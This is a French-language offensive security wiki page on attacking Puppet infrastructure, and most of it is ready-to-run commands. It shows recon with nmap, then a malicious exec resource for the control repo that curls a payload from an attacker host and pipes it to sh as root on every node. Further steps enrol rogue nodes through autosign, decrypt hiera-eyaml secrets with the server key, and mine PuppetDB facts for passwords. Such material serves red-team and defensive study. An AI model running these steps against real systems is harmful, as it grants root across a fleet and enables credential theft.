---
title: "Puppet : abuser du master, du dépôt de contrôle et de PuppetDB"
description: "Attaquer Puppet : injecter des ressources exec dans le dépôt de contrôle ou compromettre le master Puppet pour que les agents appliquent le code de l'attaquant en tant que root, abuser de l'autosign pour enrôler des nœuds malveillants, piller les secrets Hiera et hiera-eyaml, et exploiter les facts et rapports de PuppetDB pour une reconnaissance à l'échelle du parc."
keywords:
  - Puppet
  - puppet master
  - control repo
  - PuppetDB
  - hiera-eyaml
---

# Puppet

Puppet fonctionne selon un modèle pull : un agent sur chaque nœud récupère son catalogue compilé depuis le serveur Puppet (TCP 8140) et l'applique en tant que root. Le catalogue est construit à partir de manifests qui résident dans un dépôt de contrôle, de sorte que les points de levier sont le code qui produit les catalogues, le serveur qui les compile et les sert, et les magasins de données (Hiera, PuppetDB) qui contiennent les secrets et les facts de l'environnement.

## Trouver le serveur et les nœuds

```bash
nmap -p8140,8081 -sV <target>                     # 8140 puppetserver, 8081 PuppetDB
ls /etc/puppetlabs/ /opt/puppetlabs/              # puppet.conf, code, ssl
grep -rniE 'autosign|ca_server|server =' /etc/puppetlabs/puppet/puppet.conf
```

## Injecter dans le dépôt de contrôle

Les manifests sont du code, déployé depuis un dépôt de contrôle Git par r10k ou Code Manager. Une ressource `exec` ajoutée à un manifest ou à un module s'exécute en tant que root sur chaque nœud de cet environnement à la prochaine exécution (les agents se signalent toutes les 30 minutes par défaut) :

```puppet
# added to a manifest that applies to the target nodes
exec { 'x':
  command => '/bin/sh -c "curl -s https://attacker/a | sh"',
  path    => '/bin:/usr/bin',
}
```

L'accès en écriture au dépôt de contrôle équivaut à une exécution root à l'échelle du parc ; voir [versioning](../versioning/git/hooks-and-config-execution.md) pour obtenir cet accès en écriture.

## Autosign et nœuds malveillants

Si la CA est configurée avec `autosign = true` (ou un script d'autosign faible), tout hôte qui demande un certificat pour un nom **inutilisé** est signé et peut s'enrôler comme nœud géré, tirer des catalogues et lire les données d'environnement que ces catalogues portent. L'autosign n'émet pas un second certificat pour un nom qui est déjà un nœud géré, donc le levier est l'enrôlement d'un nouveau nœud, souvent nommé de façon à correspondre à une règle de groupe ou de classification de nœuds afin de recevoir un catalogue privilégié, et non l'usurpation d'un nœud existant :

```bash
puppet agent --test --server <puppetserver> --certname attacker-node.corp.local   # enroll a NEW name if autosign is on
```

## Piller Hiera et PuppetDB

Hiera est le mécanisme de recherche de données de Puppet ; il contient des données par nœud et par environnement, y compris des identifiants. hiera-eyaml chiffre les valeurs, mais la clé privée se trouve sur le serveur :

```bash
find /etc/puppetlabs -name '*.eyaml' -o -name 'hiera.yaml'
# with the eyaml keys from the server, decrypt the values
eyaml decrypt -f secrets.eyaml --pkcs7-private-key /etc/puppetlabs/puppet/keys/private_key.pkcs7.pem
```

PuppetDB stocke les facts, les catalogues et les rapports de chaque nœud et expose une API de requête. C'est une mine d'or pour la reconnaissance : les facts portent souvent des secrets, et les ressources exportées cartographient les relations de confiance à travers le parc. PuppetDB écoute en TLS avec authentification par certificat sur le port 8081 et en HTTP en clair uniquement sur le port de loopback 8080, donc interrogez-le depuis un point d'ancrage sur l'hôte PuppetDB via 8080, ou via 8081 avec un certificat client pris sur un nœud Puppet :

```bash
# from a foothold on the PuppetDB host (local plaintext port)
curl -s 'http://localhost:8080/pdb/query/v4/facts' | jq '.[] | select(.name|test("password|secret|key";"i"))'
# remotely, with a node's client cert and key for the TLS listener
curl -s --cert node.pem --key node.key 'https://<puppetdb>:8081/pdb/query/v4/nodes' | jq '.[].certname'
```

## Suite

La compromission du dépôt de contrôle ou du master équivaut à root sur chaque nœud géré ; les secrets Hiera, les facts de PuppetDB et les certificats signés étendent la portée et alimentent la réutilisation d'identifiants dans l'ensemble du parc.

## Références

- [Dépôt de contrôle Puppet et r10k / Code Manager](https://www.puppet.com/docs/pe/latest/control_repo)
- [API de requête PuppetDB (PQL)](https://www.puppet.com/docs/puppetdb/latest/api/query/v4/overview)
- [hiera-eyaml](https://github.com/voxpupuli/hiera-eyaml)
